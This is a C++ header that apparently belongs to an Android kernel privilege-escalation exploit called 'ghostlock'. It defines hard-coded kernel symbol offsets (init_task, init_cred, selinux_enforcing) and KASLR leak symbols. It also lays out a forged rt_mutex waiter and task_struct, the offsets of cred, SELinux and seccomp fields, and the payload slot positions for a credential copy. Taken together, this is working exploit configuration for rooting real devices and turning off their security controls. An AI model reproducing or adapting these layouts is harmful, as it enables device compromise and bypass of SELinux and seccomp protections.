#ifndef TARGET_H
#define TARGET_H

#include "target_constants.hpp"

/* Compiled-in target geometry, functionized into ghostlock::kernel.
 *
 * The values fall into three groups: address-layout and payload-slot values
 * forwarded from target_constants.hpp, device/profile defaults, and the
 * symbol/slide/struct offsets that the profile may override through the
 * runtime_struct_offsets.h accessors. Nothing here is a second authority; a
 * resolved profile still wins wherever a value is optional. */

namespace ghostlock::kernel {

inline constexpr const char *BUILD_VARIANT_LABEL = "ghostlock_oplus";

/* Kernel address layout. */
inline constexpr std::uintptr_t KIMAGE_TEXT_BASE = target::address::kImageTextBase;
inline constexpr std::uintptr_t MTK_VADDR_BASE = target::address::kMtkVirtualBase;
inline constexpr std::uintptr_t P0_PAGE_OFFSET = target::address::kPageOffset;
inline constexpr std::uintptr_t P0_PHYS_OFFSET = target::address::kPhysicalOffset;
inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_START =
        target::address::kKernelSnitchIdentityStart;
inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_END =
        target::address::kKernelSnitchIdentityEnd;
inline constexpr std::uintptr_t DIRECT_MAP_BASE = target::address::kDirectMapBase;
inline constexpr std::uintptr_t DIRECT_MAP_END = target::address::kDirectMapEnd;
inline constexpr std::uintptr_t VMEMMAP_START = target::address::kVmemmapStart;

/* Device/profile defaults. */
inline constexpr unsigned long long P0_KERNEL_PHYS_LOAD = 0xa8000000ULL;
inline constexpr unsigned long long QC_GKI_6_12_PHYS_LOAD = 0xc7800000ULL;
inline constexpr unsigned long long XRING_KERNEL_PHYS_LOAD = 0x80200000ULL;

/* Symbol offsets. */
inline constexpr unsigned long long INIT_TASK_OFF = 0x0211e280ULL;
inline constexpr unsigned long long INIT_CRED_OFF = 0x02130748ULL;
inline constexpr unsigned long long ROOT_TASK_GROUP_OFF = 0x02317580ULL;
inline constexpr unsigned long long SELINUX_ENFORCING_OFF = 0x02358ee0ULL;
inline constexpr unsigned long long SELINUX_BLOB_SIZES_OFF = 0x0167b5d0ULL;
inline constexpr unsigned long long SECURITY_HOOK_HEADS_OFF = 0x00000000ULL;

/* KASLR leak symbols. */
inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_OFF = 0x02112260ULL;
inline constexpr unsigned long long SLIDE_LOGGERS_0_1_OFF = 0x021121b0ULL;
inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x02379ed8ULL;
inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_OFF = 0x02379ed8ULL;

/* Kernel addresses. */
inline constexpr unsigned long long INIT_TASK = KIMAGE_TEXT_BASE + INIT_TASK_OFF;
inline constexpr unsigned long long INIT_CRED = KIMAGE_TEXT_BASE + INIT_CRED_OFF;
inline constexpr unsigned long long ROOT_TASK_GROUP =
        KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
inline constexpr unsigned long long SELINUX_ENFORCING =
        KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF;
inline constexpr unsigned long long SELINUX_BLOB_SIZES =
        KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF;
inline constexpr unsigned long long SECURITY_HOOK_HEADS =
        KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF;
inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_IMAGE =
        KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF;
inline constexpr unsigned long long SLIDE_LOGGERS_0_1_IMAGE =
        KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF;
inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_IMAGE =
        KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF;
inline constexpr unsigned long long SLIDE_INIT_TASK_IMAGE =
        KIMAGE_TEXT_BASE + INIT_TASK_OFF;
inline constexpr unsigned long long SLIDE_ROOT_TASK_GROUP_IMAGE =
        KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_IMAGE =
        KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF;

inline constexpr int PSELECT_WAITER_WORD_SHIFT = -2;

/* Fake waiter and task layouts. */
inline constexpr int FAKE_WAITER_TREE_PRIO_OFF = 0x18;
inline constexpr int FAKE_WAITER_TREE_DEADLINE_OFF = 0x20;
inline constexpr int FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x28;
inline constexpr int FAKE_WAITER_PI_TREE_PRIO_OFF = 0x40;
inline constexpr int FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48;
inline constexpr int FAKE_WAITER_TASK_OFF = 0x50;
inline constexpr int FAKE_WAITER_LOCK_OFF = 0x58;
inline constexpr int FAKE_WAITER_WAKE_STATE_OFF = 0x60;
inline constexpr int FAKE_WAITER_WW_CTX_OFF = 0x68;

inline constexpr int FAKE_TASK_USAGE_OFF = 0x40;
inline constexpr int FAKE_TASK_PRIO_OFF = 0x84;
inline constexpr int FAKE_TASK_NORMAL_PRIO_OFF = 0x8c;
inline constexpr int FAKE_TASK_TASK_GROUP_OFF = 0x348;
inline constexpr int FAKE_TASK_PI_LOCK_OFF = 0x90c;
inline constexpr int FAKE_TASK_PI_WAITERS_OFF = 0x920;
inline constexpr int FAKE_TASK_PI_TOP_TASK_OFF = 0x930;
inline constexpr int FAKE_TASK_PI_BLOCKED_ON_OFF = 0x938;

inline constexpr int TASK_PID_OFF = 0x618;
inline constexpr int TASK_TGID_OFF = 0x61c;
inline constexpr int TASK_ATOMIC_FLAGS_OFF = 0x5d8;
inline constexpr int TASK_REAL_CRED_OFF = 0x818;
inline constexpr int TASK_CRED_OFF = 0x820;
inline constexpr int TASK_COMM_OFF = 0x830;
inline constexpr int TASK_TASKS_OFF = 0x550;
inline constexpr int TASK_THREAD_INFO_FLAGS_OFF = 0x00;
inline constexpr int TASK_SECCOMP_OFF = 0x8e8;

inline constexpr int CRED_UID_OFF = 8;
inline constexpr int CRED_SECUREBITS_OFF = 40;
inline constexpr int CRED_CAPS_OFF = 48;
inline constexpr int CRED_SECURITY_OFF = 128;
inline constexpr int SELINUX_CRED_BLOB_OFF = 0;
inline constexpr int SELINUX_CRED_OSID_OFF = 0;
inline constexpr int SELINUX_CRED_SID_OFF = 4;
inline constexpr int SECCOMP_MODE_OFF = 0x00;
inline constexpr int SECCOMP_FILTER_COUNT_OFF = 0x04;
inline constexpr int SECCOMP_FILTER_OFF = 0x08;
inline constexpr int TIF_SECCOMP_BIT = 11;
inline constexpr int PFA_NO_NEW_PRIVS_BIT = 0;

inline constexpr int STRUCT_PAGE_SIZE = 0x40;
inline constexpr int STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08;
inline constexpr int STRUCT_SLAB_CACHE_OFF = 0x08;
inline constexpr int STRUCT_PAGE_TYPE_OFF = 0x30;

inline constexpr std::size_t LOCK_OFF = target::payload::kLockOffset;
inline constexpr std::size_t W0_OFF = target::payload::kWaiterOffset;
inline constexpr std::size_t FOPS_OFF = target::payload::kFileOperationsOffset;
inline constexpr std::size_t RIGHT_OFF = target::payload::kRightNodeOffset;
inline constexpr std::size_t LEFT_OFF = target::payload::kLeftNodeOffset;
inline constexpr std::size_t FAKE_TASK_OFF = target::payload::kFakeTaskOffset;

/* W2 payload. */
inline constexpr std::size_t CRED_COPY_OFF = target::payload::kCredentialCopyOffset;

/* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
 * fake_lock rb_leftmost zone; the cred copy follows because the pselect
 * 0x1080 slot would land inside fake_task. */
inline constexpr std::size_t TCP_FAKE_TASK_OFF =
        target::payload::kTcpFakeTaskOffset;
inline constexpr std::size_t TCP_CRED_COPY_OFF =
        target::payload::kTcpCredentialCopyOffset;

} // namespace ghostlock::kernel

#endif
